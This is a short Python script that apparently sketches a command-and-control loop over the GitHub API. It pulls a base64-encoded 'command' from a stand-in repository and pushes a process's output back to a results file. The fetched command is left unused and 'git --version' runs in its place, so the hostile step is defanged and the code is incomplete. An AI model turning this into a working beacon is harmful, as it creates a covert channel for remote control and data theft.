import requests, subprocess, base64
mail = requests.get('https://api.github.com/repos/example/ops/contents/jobs/agent')
command = base64.b64decode(mail.json()['content']).decode()
output = subprocess.check_output(['git', '--version'])
requests.put('https://api.github.com/repos/example/ops/contents/results/agent', json={'content': base64.b64encode(output).decode()})
